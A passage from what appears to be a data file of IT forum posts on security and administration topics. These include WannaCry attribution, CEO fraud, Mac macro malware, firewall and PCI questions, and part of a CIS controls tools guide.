remedies and mitigations you’ve put in place to reduce the risks for the businesses you support.",12

1945994,What security needs should be met to have an effective security policy?,"“Effective security” can mean different things to different people. Some would immediately talk about layers of security and others would remark on different types (antivirus, white listing, spam blockers, etc.). But what both of these answers have in common is the compatibility of different moving parts working together to stop threats.  In this blog, Jason Lamar discusses the important of a simple and open security solution that plays well with others: “Today’s threat landscape is vast and changes every day – beyond the ability of any single vendor to confront. That’s why many security organizations report vendor sprawl as a challenge, adding new capabilities to overcome the lack of integrated effectiveness in others. Most organizations who pursue a best of breed approach believe there is a significant people and effectiveness pay-off, but often the chosen solutions don’t play well together and result in a tough-to-manage “frankenstructure” for their operators. Some of them have even told me: “I probably wouldn’t have invested in C if A and B worked together.” To truly be effective, security solutions must be built with openness in mind. Real openness fosters solutions that actually deliver on the promise of best of breed because they can interoperate. Customers can purchase technologies that solve incrementally more of their security problem and know that they will work together and strengthen defenses.” What do you think is the most important aspect of security for it to be effective?

2153182,Securely taking credit card numbers for prepaying bills.,"Hoping someone has some experience with this.I'm new-ish and manage the IT related work for a group of restaurants. They book large parties and have historically taken credit card information from the guests to charge later after the meal. Pharmaceutical banquets actually already have forms with the credit card information to just fax on over.So there's a lot of credit card information floating about. This was mitigated by the previous IT admin who quarantined all the emails via Google Admin. Except he was a contractor... and then he had all the emails with all the credit card numbers quarantined into one place...Thankfully, he never did anything with them.The company then switched to calling the guests over the phone and then physically writing it down and storing it, which is what they do today. The quarantined emails still get quarantined and I just discovered them today.The forms they used to send would require the picture of the card be taken along with their contracts.The restaurants prefer to be able to get the number so they can keypunch it later so it is appropriately filed in the day's sales and don't like taking actual deposits.Has anyone had to deal with anything like this, how was it handled? Is there some sort of online secure vault to which they could manage their credit card information or guests could submit it somehow to that online vault to be run later?Seems like a simple issue, just can't reasonably come up with a fix.

1928487,How to handle Scam calls?,"The company to which I'm employed also has a sort of sub-company within, owned as a separate entity but also located on site. Previously, they were in a different location.Both in the previous location and their new current location, they have received multiple calls from people supposedly in the employ of Microsoft. When pressed hard enough, they either retort to hostility, or simply hanging up. They've threatened this company multiple times with cyber-attacks, and may have once actually compromised a user's computer with one of them via email.Today, one of the users at this sub-company gave me a call concerning a pop-up that appeared indicating some severe error, though since it was:1. Within Internet Explorer2. Had a pretty spoofed address3. Did not follow any standard Microsoft layout.It included a recovery number, which I called to investigate. I received a loud, ruckus-filled room and a man with a distinctively thick accent. I had called with *67, and once I recognized it as the same individuals who have been harassing my users for several months now, I hung up. Immediately, they called me back (Guessing they pulled a *69) When I asked who they worked for, they replied Microsoft. When I stated, ""I don't believe you. Can you provide proof?"" They hung up.I proceeded to call again, receive the same individual, and instructed him to stop calling, to which he once more hung up.Are there any potential solutions for this sort of issue? ",0

Learn more about how to submit and get your stories featured on the home page in our Breaking News guidelines.While there were suspicions that North Korea was behind the massive WannaCry ransomware attacks that took place in May of 2017, nothing was made official — until now. White House Homeland Security adviser Tom Bossert on Monday made a statement saying that the US, UK, Australia, Canada, and New Zealand all agree ""based on evidence"" that North Korea is to blame for the malware outbreak. According to the BBC:The US and UK governments have said North Korea was responsible for the WannaCry malware attack affecting hospitals, businesses and banks across the world earlier this year.The attack is said to have hit more than 300,000 computers in 150 nations, causing billions of dollars of damage.It is the first time the US and UK have officially blamed them for the worm.Governments used to be cautious about attribution in cyber attacks but it is becoming increasingly common - beginning with the claim North Korea was behind the attack on Sony in 2014 and more recently involving Russia's alleged hacking in the 2016 US election.Bossert went on to say, ""North Korea has acted especially badly, largely unchecked, for more than a decade, and its malicious behavior is growing more egregious. WannaCry was indiscriminately reckless.""What are your thoughts on this recent announcement?",11

746480,UTM Necessity and Price,"Here's the scenario: SMB, approximately 40 seats now, potentially expanding to 60 or more within the next couple years, another device provides content filtering, quality endpoint protection and security policies in place. A third party provides much of our network equipment and services (non-negotiable in order to connect to DMS). That third party is selling us a Fortigate for $1,300 initial setup and $232 per month for support and hardware rental. That works out to $2,784 per year, which, to me, looks outrageous. At our other location, we don't have any kind of UTM in place (we have content filtering, but that's all), and we haven't really had any problems since I shored up our endpoint protection and security policies. My questions are:Is a UTM really necessary in this environment? If so, how does $2,784 per year compare to what we could expect purchasing our own device? How much ongoing configuration would be required? Being a one man IT department with an already full workload, if our own UTM would require a lot of attention, that price may be justifiable.",5
545610,"Individual File Encryption, Tracking, and Redeactability Products","So I've been tasked with researching a product I think the parent company is considering selling, and I was told to try to find competitors for this product and who else uses it or their competitor's product(s) and what the use cases are.But honestly I really can't find another product that does what this one does. So, I'm turning to the community to see what, if any, encryption and file tracking programs you all know about.The product's name is ""Final Code"" and it does per-file basis encryption and offers a number of controls. You can lock down whether you want the file to be editable or not, printable or not, print-screen..able or not, etc. You also set who can open the file, etc.But what's really unique about it is that the file isn't necessarily stored on the cloud/service provider. Just the encryption keys are. The file itself can be emailed, put on disk, etc. So even if it's a massive file, you can give it to a person on USB drive or something and, when they open it, it contacts the server online to get the encryption key. It separates the key from the file. This also makes it really easy to audit who opened the file and when, when it was changed, and, if you need to ""self destruct"" or redact the file, you simply tell the service to stop handing out the encryption key and the file is useless.I honestly have not found a similar product on the market for this. There are plenty of other projects that do encryption, but definitely nothing I've found that has this level of control.Obviously the file types it supports are limited, it mostly runs on Windows only (and, oddly, iOS. But no MacOS, etc), and so it's not universal for any file, but it really does offer a remarkable amount of control.As for use cases, there I'm a little stumped. It seems rather over-kill for daily files, but much more likely to be used with contractors and the like with whom you have to share sensitive information (like Intellectual Property, private customer data, etc). I suppose it depends on what your business does and how often you'll be corresponding sensitive data with outside persons. Do you know of any other products that fit this bill? What does your company use for encrypting and transmitting sensitive information, and how do you ensure that sensitive files are not left out there in the wind, encrypted or not? For reference about Final Code, you can see their English webpage below. I've actually linked the ""mechanism"" page because that's what I find most interesting...http://www.finalcode.com/en/about/mechanism/",0

558446,Ethical Hacking followup from Aug 7 Spiceworks Webinar,"Webinar Audience Question: Are audit and penetration testing required in healthcare to meet ""Meaningful Use""?My interpretation is that ""Meaningful Use"" does not require a pen test, but a pentest could be a part of a Risk Assessement that Covered Entities perform to be safer. I don't see anything that calls for an independent 3rd party to review security.Risk Assessment/Analysis is a part of 1996 HIPAA. Covered Entities are supposed to be inspecting themselves because of 1996 HIPAA. Meaningful Use is from the 2009 HITECH act. The 1996 Health Insurance Portability and Acccountability Act (HIPAA) calls for Risk Assessment for covered entities (aka hospitals/clinics/asp’s). This guidance from HHS OCR in 2010 clarifies HIPAA Risk Assessment.http://www.hhs.gov/ocr/privacy/hipaa/administrative/securityrule/rafinalguidancepdf.pdfThe phrase “Meaningful Use” comes from the HITECH act of 2009. HITECH basically updates-reinforces-strengthens HIPAA guidance and HIPAA enforcement.http://en.wikipedia.org/wiki/Meaningful_use#Meaningful_use“Meaningful Use” is a set of standards being rolled out in stages to certify Electronic Healthcare Record (“EHR”) technology. If an EHR is certified, then a covered entity can receive reimbursement from an incentive program. Inside Health and Human Services (“HHS”) is the Center for Medicare and Medicaid Services (“CMS”). CMS has an incentive program to reward covered entities.http://www.cms.gov/Regulations-and-Guidance/Legislation/EHRIncentivePrograms/Downloads/EHR_Medicaid_BegGuide_Stage1.pdfCovered entities are not mandated to participate in Meaningful use, but if they do participate, they will be financially rewarded. The effort to get certified for Meaningful use is significant.“Core Measure 9” of “Meaningful Use Stage 2” of HITECH reminds us to do a Security Risk Analysishttp://www.cms.gov/Regulations-and-Guidance/Legislation/EHRIncentivePrograms/downloads/Stage2_EPCore_9_ProtectElectronicHealthInfo.pdfThe 2009 HITECH act requires that HHS perform audits of covered entities (aka hospitals and clinics)http://www.hhs.gov/ocr/privacy/hipaa/enforcement/audit/As of Aug 2014 HHS OCR is in the process of its Pilot Audit Programhttp://www.hhs.gov/ocr/privacy/hipaa/enforcement/audit/auditpilotprogram.htmlAs of Aug 2014 here is the HHS OCR Pilot Audit Program Protocol. This is not the final version. Once the final version is released, I believe HHS OCR will have higher expectations for Covered Entities to be compliant and have teeth to enforce compliance.http://www.hhs.gov/ocr/privacy/hipaa/enforcement/audit/protocol.html﻿My interpretation is that covered entities have had since 1996 to prepare for an I.T. Audit and have been dropping the ball based on the failures listed here:http://www.hhs.gov/ocr/privacy/hipaa/administrative/breachnotificationrule/breachtool.html﻿My position is that Covered Entities should prepare for I.T. audit sooner rather than later. Inventory, then Vulnerability Analysis, then Risk Assessment, are all parts of an I.T Audit. It's prudent for covered entities to get audit ready before HHS finishes their audit protocol.A good resourcehttp://www.healthit.gov/sites/default/files/pdf/privacy/privacy-and-security-guide-chapter-2.pdf﻿",0

1964627,[Heads-Up] First-Ever Russian Malicious Mac Macro Discovered,"Appleinsider reported Feb 9, 2017: ""Mac malware discovered in Microsoft Word document with auto-running macro"", which was the second example of malware targeting macOS users this week.  Security researchers have detected the first in-the-wild instance of hackers are making use of malicious macros in Word documents to install malware on Mac computers – an old Windows technique. The hack uses the same social engineering tactic, tricking victims into opening infected Word documents that subsequently run malicious macros.The malicious Word file discovered was titled ""U.S. Allies and Rivals Digest Trump's Victory – Carnegie Endowment for International Peace.docm.""  Mac users are always prompted to enable macros, but the bad guys are going after the weak link, the users.Clicking the embedded macro executes a function, coded in Python, that downloads the malware payload to infect the Mac PCs, allowing hackers to monitor webcams, access browser history logs, and steal password and encryption keys.Patrick Wardle, director of research at security firm Synack, said the Python function is virtually identical to EmPyre – an open source Mac and Linux post-exploitation agent. ""It’s kind of a low-tech solution, but on one hand it’s abusing legitimate functionality so it’s not going to crash like a memory corruption or overflow might, and it’s not going to be patched out,"" said Wardle.Wardle tracked the IP address from which the malicious Word documents were spread to Russia and that IP has previously been associated with malicious activities like phishing attacks. Not surprisingly, macOS malware is targeting mostly the defense industry and reportedly has been used against a human rights advocate.The best way to avoid these kinds of attacks is to step employees through new-school security awareness training and have them deny permission to enable macros from running when opening a Word document they did not ask for, and avoid downloading software from third-party App Store or untrusted websites.",0

1389407,Star Wars: A New Threat,"When you really think about it Star Wars is all about “threats”. The threat of the Empire taking control over the Galactic Empire, the threat of the rebellion overtaking the Empire, the threat of Luke turning to the Dark Side—the list could continue on for a long time in a galaxy far, far away. What fans everywhere have always laughed about is the fact that the Death Star builders never predicted that a major threat to their entire space station would be a single X-wing starfighter firing a pair of proton torpedoes down a small thermal exhaust shaft. I’m not a fan of the Dark Side, but if the Death Star (specifically Tarkin and Motti) had been smarter they would have tried to better understand their weaknesses, the rebellion’s behaviors, how their targets change, and how they could have better protected themselves.﻿The Death Star is a great example of how today’s security threats work. A new technology (in this case the Death Star) is created and hackers (the rebellion) find ways to infiltrate the system and bring it down.

1341172,"Despite Warnings, CEO Fraud Scams Still Successful And Growing"," In the last few months, law enforcement has warned repeatedly about a new scam that is rapidly expanding. The FBI calls it ""Business Email Compromise"" (BEC), but it is better known as ""CEO Fraud."" Now Symantec sounds the alert. They have a service called Email Security Cloud and they see these types of spoofed CEO emails trending up. ""BEC attackers target senior-level employees rather than consumers as it’s easier to scam them out of large amounts. In one incident, we observed the scammers asking the target to transfer over US$370,000. By requesting large amounts of money, the scammers only need to be successful a couple of times to make a profit,"" Symantec researchers explained.They continued with: ""The FBI estimates that the amount lost to BEC between October 2013 and August 2015 was over $1.2 billion. With such huge returns, it’s unlikely that these scams will cease any time soon.""C-level employees, especially CEOs and CFOs, have to be aware of the various techniques the scammers are using to trick them into wiring out large amounts of money. We have warned about this before. ﻿Crafting The EmailCompromising the CEO’s email accountSpoofing the CEO’s email addressUsing a form of typo-squatting where the email address uses a domain  which resembles the targeted company’s actual domain (e.g. myydomain.com  vs mydomain.com). These domains are often registered on the same day that the email is sent.The scammers use a few simple tricks to try and avoid arousing suspicion. The emails often state how the CEO is traveling or is in a meeting and can’t accept phone calls. Many of the emails have ""sent from my iPad"" appended, to suggest the sender is on the road or excuse typos in the message.The scammers know their targets: the names and email addresses of executives can often be found on the company website or on LinkedIn. Sometimes the emails will be short and simple (""I need you to initiate a wire transfer for the company, confirm if you can process it today so I can forward you the instructions"", signed with the name of the CEO).﻿   ﻿But sometimes they are much longer and sophisticated. What To Do About ItSymantec stated: ""User education is the most effective means of protecting companies against BEC scams"". We could not agree more. Here are a few hints and tips you can send to your Accounting department, and cc your CEO while you are at it.Double-check any emails that request actions which seem unusual or aren’t following normal procedures. Make it OK to ""query"" wire transfers higher than a secret agreed-upon amount.Verify the email via a different medium, for instance the phone or fax.Use two-factor and/or two-person authentication to make wire transfers.Grab this updated version of our Social Engineering Red Flags PDF, print and laminate it, and give it to everyone. (There is no charge)If you believe you have been a victim of CEO Fraud, notify your financial institution as fast as possible (24 hours is already on the late side to try to claw back wire transfers) and report the fraud with your local law enforcement agency for later insurance and legal procedures.

477890,Kaspersky firewall question,"We are rolling out Kaspersky 10 which is managed by KES10 on 2008R2 server. Most computers are in different subnets from where KES10 is (call it Main Subnet). After client installed and computers moved into Managed Computers with default policy, they stopped responding to pings and I can't RDP to them either. It all works if I RDP to their repspective sunbet's server which currently has an older AV client, and then I can RDP to my non-responding computers just fine. Sounds to me like that it's a Kaspersky firewall issue and default has some ICPM and Remote stuff blocked. Perhaps you can point me to a detailed documentation on KES10 (firewall) options or for now just let me know what I need to do on KES10 to tweak the policy so I can RDP to my other subnets from Main Subnet. We are not using windows firewall and our router firewall hasn't changed in respect to this rollout, so they are out of the question. Thanks.

607656,RSA vs DSA encrypted output size,If I use RSA with a 512 bit key to encrypt some text would my encrypted string be 64 bytes (this is what I have been told)? This is to encrypt a relatively short string of characters. DSA keys can only be 512 or 1024 bit is this correct? If I use DSA would my output be less than 64 bytes? I need the smallest possible encrypted output string I can get using asymmetric encryption. I know RSA at 512 can be broken easily but the time to live for this application and its private key is very short. Are there any other options? What is the encrypted output length of both RSA and DSA when a 512 bit key is used? Can DSA use smaller keys?,5

1015433,VPN passthrough problems with new deployment,Really having some problems with my recent deployment of my UTM.  My UTM is my gateway router/firewall and my IPSec VPN device sits in my DMZ.  I've read where you need to add rules to the UTM to get the IPSec traffic to pass though the UTM but the rules aren't working completely.  I've got 8 VPNs that need through so I created host definitions for the public IP addresses of the endpoints and put them in a group.  I then created a rule that allows IPSec traffic from the external IP address to the host definition of the DMZ IP address of the IPSec VPN device.  The IPSec traffic is the predefined service group on the UTM.  When I do that 5 of my VPNs come up but the other 3 do not.  I clearly see blocked IPSec traffic in the firewall log that shouldn't be getting block per the rule.  So I create a rule for the traffic I see getting blocked and allow it.  Which I don't think I should have to do but I did anyway to try and get the VPN up.  I stop seeing the traffic getting blocked but I'm not seeing the traffic get to the VPN device either.  After hours of troubleshooting I finally had to revert back to my old setup to bring all the VPNs up.  I'm basically just creating another level of security with this router as the VPN device is/was my gateway router now.  The Sophos interface seems pretty easy to configure but only if it does what you think it should be doing.  Please help.,0

1691167,Are You Safer Unplugging on Vacation?,"You probably know by now that I love technology.  I have either my phone or my tablet nearby at all times.  I’ve had a FaceTime conversation with my kids from the top of Mt Fuji, on the side of a canal in Amsterdam and from countless hotel rooms.  I love being connected to friends and family at all times.  However, just like we take breaks from work on the weekend and on vacation, shouldn’t we also look at occasionally unplugging from our phones?  It’s a lot harder than it sounds.  We recently asked around 14,000 people from all over the globe about how they go about unplugging from their devices.  The positive news?  65% of the people who unplugged said it helped them enjoy their vacation more.In Gary’s blog, he talks about some of the mental health benefits of “unplugging” while on vacation.  I’d like to take a little bit of time to focus on the cybersecurity benefits of unplugging while traveling.  When travelling out of the country, people are always on the lookout for free Wi-Fi to check email, social media, verify reservations, etc.  This can also be a great opportunity for cybercriminals to attempt to infect your device with malware.How can connecting to a Wi-Fi network infect me? There are many ways connecting to an unknown network can be dangerous, but let’s focus on two of the methods you’re most likely to encounter.The first is the “man-in-the-middle” attack (MITM).  To set up a MITM, the cybercriminals sets up a Wi-Fi network using their laptop.  They take the laptop and place it in a populated area, like a coffee shop or café and wait for people to connect.  An unsuspecting user then sees an open Wi-Fi connection (often with a name like “FREE WIFI”) and connects.  However, instead of connecting directly to the internet, all of the victim’s traffic is first going through the cybercriminal’s laptop where they can capture all the traffic in real time.  This gives the attacker access to logins and passwords and they could even inject malware into otherwise safe web traffic as it makes its way from the web to the victim’s system.A less sophisticated method used to attack people connecting to a free network is to require the user register with the Wi-Fi network before gaining access to the internet.  This uses a standard method called a “captive portal” like you see on hotel networks or some coffee shop networks.  This redirects you to a sign up page before connecting to the internet.  This page could contain malware that downloads in the background.  The owner of the network could also simply resell your email address and whatever other contact information they gained for use in spam and/or phishing campaigns.So how does your vacation destination stack up? Looking through the data collected by our McAfee Labs team in the first three months of this year, we can see that some travel destinations have a higher count of mobile malware.  Thinking of heading to the Olympics in Rio this summer?  We saw around 60,000 pieces of mobile malware in Brazil over a three month time span! This number will only increase with an influx of tourists looking to connect to any Wi-Fi network they can to post photos and videos to their loved ones back home.﻿Brazil’s not the only popular vacation spot where we see a lot of malware.  In fact, we see large amounts of mobile malware in India and the United States as well as many other popular vacation destinations.But what if I don’t want to unplug? Unplugging can be difficult, especially if you’re having a great time that you want to share with your friends and family back home.  So if you can’t completely unplug, how do you remain safe on your vacation?1.    Use offline mode for maps. Trying to navigate a foreign country can be extremely nerve-wracking and we’re so used to having a great navigation tool in our pocket.  Most popular map applications allow you to download maps for use without an internet connection.   A search for “offline maps” will return a lot of great results with tutorials on enabling maps for use without an internet connection.2.    Connect to known good Wi-Fi networks. To avoid man-in-the-middle attacks or related scams, try to only connect to hotspots you know, like your hotel or an established coffee shop chain.  There’s no way to guarantee 100% safety on even known networks, but it will definitely reduce your risk.3.    Install security software on your devices. The number of threats continues to grow across PC, Mac OS and Android.  Having anti-malware and security software on your devices will help keep your systems safe as you travel and visit new and strange networks.Vacation can be a great time to have new experiences, see new things, try new food and enjoy life.  It shouldn’t be a time for you to worry about your devices being hacked.﻿",12

Sometimes it's easy to clearly describe simple ideas, but other times you need to break things down using an analogy to get your point across. What are some of the the best cybersecurity analogies you've used? Let's share the ones that have worked for us in the past. I'll start with a few computer security analogies I've used successfully:  1. Cybersecurity layers of protectionTo explain why we need firewalls, antivirus, and passwords in addition to security answers, I've said putting more layers of protection in place can make your data safer (if done right). To reduce your risk, you want to make a hacker jump through as many hoops as possible before they can get to your valuable information. The analogy here is putting the crown jewels in a locked box. Then you put that box in a locked chest, which is shut inside a vault. If you want to expand the analogy further, you can surround everything in a fortress that's surrounded by castle walls, which are all protected by a moat. In other words, a hacker might be able to get past one layer of defense, but additional protection measures you put in place can make it harder for the wrong people to get to your precious data. That's why you often have to go through multiple steps, such as entering a password to access your computer, another one to access specific applications or services, then you need to verify your identity using 2-factor-authentication.  2. Cybersecurity arms raceCybersecurity is like an arms race with both sides constantly evolving their weapons and defenses. You need to continuously evolve your security strategy, or you might get left behind in the race, holding a sword and shield to protect yourself against a fighter jet.On one side, hackers are coming up with new phishing techniques, creating new and increasingly dangerous types of malware every day, constantly setting traps for victims to get caught up in, and searching for new vulnerabilities to exploit.On the other side, the good guys need to develop measures to protect against new threats, continuously update security software definition files, patch software and OSes regularly, stay vigilant when on the web, and educate everyone in their organization about new threats, so they won't fall victim to them.  3. Your primary email holds the keys to many other accountsRecently I had to explain to a computer novice why hackers compromising a primary email account means they might be able to access other accounts linked to that email too (banking, shopping, secondary email accounts, etc). The analogy I used that made things click was this: Imagine the members of your family live in several houses and you keep the keys to each place in a primary residence. If someone breaks into the main house, they have access to all the keys, so they can get into the other houses too. Therefore, to be safe, you need to change the locks at all of the houses, or you might get broken into again. In the real world, this means changing all passwords on any accounts that are linked to your primary email address. Additionally, making sure no one has tampered with your backup email addresses, linked mobile numbers, and security questions on all accounts, which the bad guys could use to continue to break in over and over again even if the main passwords are reset.  Share your security analogies!What security analogies have you used successfully with non-technical people?  ",0
423348,Firewall for School District,"Hello all, This question is mainly aimed towards folks in education.  We are currently in the market for a new firewall.  Our current firewall is provided by our ISP and we are in the process of dropping them as our ISP.  Our new ISP's firewall does not allow us to have as much control over it as I would like so we are most likely going to buy our own. My question is, what are other school district using?  With so many on the market, it is hard to decide which is best for the unique needs of a public school district.  Functions MUST include web filtering by group, PPTP VPN, SSL VPN, IPSec VPN, NAT/SNAT/PAT, integration to LDAP, multiple network interfaces, and an easy to use GUI. I know practically every firewall will most likely do what I need it to but I would like to get a sense on what others are using and their opinion on the product.  Any advice that can be offered is greatly appreciated. Thank you.Happy Holidays,Justin Putnam",0
561491,Thoughts on Transparent Proxy Filtering (SSL / HTTPS),"Hi Spicies, My Ed Office is ready to deploy a proxy based solution. We are currently using Websense, but without the secure gateway / anywhere product, hence no filtering for SSL traffic, i.e. sites like FB! We need CIPA compliance ASAP, and we need to make sure the teachers can reasonably circumvent filtering as needed for educational purposes.It really comes down to Lightspeed v. Websense at this point in the game for us with pricing, etc. Who has experience deploying a transparent proxy that will allow selective http and https traffic, AND with limited client configuration; hopefully simple certificate or agent on endpoints?  Your thoughts are appreciated!Spicely,Eric",5
199627,PCI 101 for hotels,"I am taking on a client that is a small chain of Hotels. They have no IT staff & outsource some of the break/fix work to a local IT shop. They have no 'oversight' as such of the whole operation & 2 new hotels coming on-line this year.  I am told by semi knowledgeable staff there that the POS software is PCI Compliant, but I cannot find any details of how. There are also other machines on the network for office use & such, as well as some sort of separate guest WiFi network run by the other IT shop. My question is: Can anyone give me a run-down on the PCI compliance needs for a hotel? Specifically does every machine on the same network as a machine which takes card payments have to be PCI Compliant? Are there any rules for internal & external Network Security to ensure compliance? Are there any gotcha's that I need to look out for? Can the guest WiFi use the same internet connection / external IP if it is kept separate from the corporate network at the network / firewall level?Thanks for any help here, I don't even know where to start with all this. ",0
286972,Backup Exec 2012 Warning,"This is a warning for anyone using Backup Exec 2012: Check your holiday backups.I thought I'd be clever, after all, who wants to work Christmas Day and New Year's Day, even if it is just checking backups and making the changes required to get Backup Exec 2012 to skip only certain jobs on particular days, right?So as you have to do in Backup Exec 2012, I excluded three whole days, 25th and 26th December and 1st January from the backup calendar. The main backups were set to run Christmas Eve and New Year's Eve, the others weren't desperate and could run a day or two late. A small price to pay to enjoy my days off, uninterrupted.I didn't notice it on the Christmas Eve backup as I was taking the quiet time in the office to re-build my laptop (although I have confirmed it happened then as well), but today I came in to find that New Year Eve's Exchange backup failed - no, sorry, it was cancelled. What? Who did that? No one did, Backup Exec did!I have worked out that when you have a backup that starts the night before an ""Excluded Date,"" if that backup doesn't finish until after midnight, Backup Exec 2012 automatically cancels the backup because it is now trying to run on an ""Excluded Date.""The scenario worked out to be that the Exchange backup to disk that was running, and had been running for an hour and 45 minutes, was cancelled by Backup Exec a few seconds after midnight because it was now an ""Excluded Date."" Yet the duplicate to tape that doesn't start until after the Exchange backup completes, ran fine, finishing 50 minutes later.What sort of logic dictates that a job that is running should be cancelled at midnight due to it now being an ""Excluded Date,"" yet a job that hasn't even started runs ok?This has confirmed my New Year's Resolution - new backup software.",0

If such devices are required, enterprise software should be used that can configure systems to allow only specific USB devices (based on serial number or other unique property) to be accessed, and that can automatically encrypt all data placed on such devices. An inventory of all authorized devices must be maintained.Refer to section 17-5 above.17-9 - ﻿Use network-based DLP solutions to monitor and control the flow of data within the network.

The menu on the left can be used for further info on approved encryption angorithms.17-12 - Monitor all traffic leaving the organization and detect any unauthorized use of encryption. Attackers often use an encrypted channel to bypass network security devices. Therefore it is essential that organizations be able to detect rogue connections, terminate the connection, and remediate the infected system.Many modern Firewalls (Open Source included) offer deep packet inspection, whereby you proxy all outbound HTTPS traffic through your device, which will decrypt the traffic, scan for data loss prevention (DLP) and re-encrypt before leaving the network.  This requires that you import and trust the network device's Certificate on all client machines.17-13 - Block access to known file transfer and e-mail exfiltration websites.Know of any tools?17-14 - ﻿Define roles and responsibilities related to management of encryption keys within the enterprise; define processes for lifecycle.This is more of a process and procedure than a tool17-15 - Where applicable, implement Hardware Security Modules (HSMs) for protection of private keys (e.g., for sub CAs) or Key Encryption Keys.Commercial Tools* FutureX * SafeNet* Thales e-Security﻿﻿Incident Response and Management﻿Section 18 is all policy and procedure.  Other than documentation tools, which doesn't really fit the purpose of this document, there's not many tools I could think of to enable you to meet these recommendations.  I will still list the section's items.18-1 - Ensure that there are written incident response procedures that include a definition of personnel roles for handling incidents. The procedures should define the phases of incident handling.﻿18-2 - Assign job titles and duties for handling computer and network incidents to specific individuals.18.3 - Define management personnel who will support the incident handling process by acting in key decision-making roles.18-4 - Devise organization-wide standards for the time required for system administrators and other personnel to report anomalous events to the incident handling team, the mechanisms for such reporting, and the kind of information that should be included in the incident notification.18-5 - Assemble and maintain information on third-party contact information to be used to report a security incident (i.e., maintain an e-mail address of security@organization.com or have a web page http://organization.com/security).AUTHORS NOTE - I would advice against security@, since many spammer know security@ is a common address in an organization.﻿18-6 - Publish information for all personnel, including employees and contractors, regarding reporting computer anomalies and incidents to the incident handling team. Such information should be included in routine employee awareness activities.18-7 - Conduct periodic incident scenario sessions for personnel associated with the incident handling team to ensure that they understand current threats and risks, as well as their responsibilities in supporting the incident handling team.Secure Network Engineering﻿19-1 - Design the network using a minimum of a three-tier architecture (DMZ, middleware, and private network).  Any system accessible from the Internet should be on the DMZ, but DMZ systems should never contain sensitive data.  Any system with sensitive data should reside on the private network and never be directly accessible from the Internet.  DMZ systems should communicate with private network systems through an application proxy residing on the middleware tier.﻿I have diagrammed how this would look in section 13-11.19-2 - To support rapid response and shunning of detected attacks, engineer the network architecture and its corresponding systems for rapid deployment of new access control lists, rules, signatures, blocks, blackholes, and other defensive measures.This is referring to a system that enables the network admin to rapidly deploy ACLs (AAA) to network devices such as a Network Management System (NMS).  Commercial Tools* HP iMC - Ability to batch deploy switch configurations, set a configuration baseline, and much more.  * Cisco ISE - NMS for Cisco devices and other devices too19-3 - Deploy domain name systems (DNS) in a hierarchical, structured fashion, with all internal network client machines configured to send requests to intranet DNS servers, not to DNS servers located on the Internet. These internal DNS servers should be configured to forward requests they cannot resolve to DNS servers located on a protected DMZ. These DMZ servers, in turn, should be the only DNS servers allowed to send requests to the Internet.﻿Free ToolsNot really a tool, but a way to securely centralize your DNS zones, called Shadow Master.  Essentially, all of your DNS servers (Internal and public facing) are getting the zone information from a single (or multiple in failover setting) DNS server that is not accessible by clients.  In the case of Active Directory Domains, where all DCs are DNS servers, the primary DC is your shadow master.  It is the master server for any non-AD integrated zone (public zones) and all of your public DNS servers receive their zones from this server.  This way, if your public DNS servers are compromised, the zone records cannot be tampered with.  Though, this can lead to a pivoting attack, in which case, the architecture described in section 19-1 may help.19-4 - Segment the enterprise network into multiple, separate trust zones to provide more granular control of system access and additional intranet boundary defenses.﻿﻿Example, not only workstations on one VLAN and servers on another, but each department is on their own VLAN.  Database servers and other extremely sensitive systems are separate on their own VLAN.  The rules governing data in motion from section 15-3 still apply.Penetration Tests and Red Team Exercises﻿20-1 - Conduct regular external and internal penetration tests to identify vulnerabilities and attack vectors that can be used to exploit enterprise systems successfully. Penetration testing should occur from outside the network perimeter (i.e., the Internet or wireless frequencies around an organization) as well as from within its boundaries (i.e., on the internal network) to simulate both outsider and insider attacks.This is much more than just vulnerability scanning using Nessus or OpenVAS.  This includes attempting to exploit the vulnerabilities found by these systems or create new vulnerabilities.  I could write an entire book on this one little section alone, so instead, I will point to some common all-in-one tools, and let you read the books already published!* Backbox Linux - Pentesting distro built on Ubuntu.  DOES NOT REQUIRE RUNNING AS ROOT!* Kali Linux - Kinda the defacto pentesting distro out there.  Most schools teach from this distro in security classes.  Requires you to run as root all the time.* PenTesters Framework (PTF) - Framework of tools that can be installed and updated on any dostro (currently only limited to Kali, Debian, and Ubuntu)﻿20-2 - Any user or system accounts used to perform penetration testing, should be controlled and monitored to make sure they are only being used for legitimate purposes, and are removed or restored to normal function after testing is over.﻿ This is just common sense.20-3 - Perform periodic Red Team exercises to test organizational readiness to identify and stop attacks or to respond quickly and effectively.This is basically 20-1 written using different words.20-4 - Include tests for the presence of unprotected system information and artifacts that would be useful to attackers, including network diagrams, configuration files, older penetration test reports, e-mails or documents containing passwords or other information critical to system operation.This is more procedures than tools.﻿﻿20-5 - Plan clear goals of the penetration test itself with blended attacks in mind, identifying the goal machine or target asset.  Many APT-style attacks deploy multiple vectors--often social engineering combined with web or network exploitation.  Red Team manual or automated testing that captures pivoted and multi-vector attacks offers a more realistic assessment of security posture and risk to critical assets.﻿ Again, libraries are written on this topic.  I could list tools here, but it would be a million lines long, and still people would be offended because I left of some obscure DNS fuzzer that they enjoy using... HOWEVER, there is one tool I can absolutly recommend...* Penetration Testing Framework - Not updated recently, but a treasure trove of information. 20-6 - Use vulnerability scanning and penetration testing tools in concert. The results of vulnerability scanning assessments should be used as a starting point to guide and focus penetration testing efforts. Refer to section 4-1﻿20-7 - Devise a scoring method for determining the results of Red Team exercises so that results can be compared over time.﻿This is more documentations, but there are a few things that could help.* DREAD Scoring Template - I have attached a template that helps me organize  vulnerabilities found based on criticality.  This helps me focus my efforts where they are needed most.20-8 - Create a test bed that mimics a production environment for specific penetration tests and Red Team attacks against elements that are not typically tested in production, such as attacks against supervisory control and data acquisition and other control systems.﻿ Because, you know...having your red team take down your main website in the middle of the day is never a good thing.Fin.",11

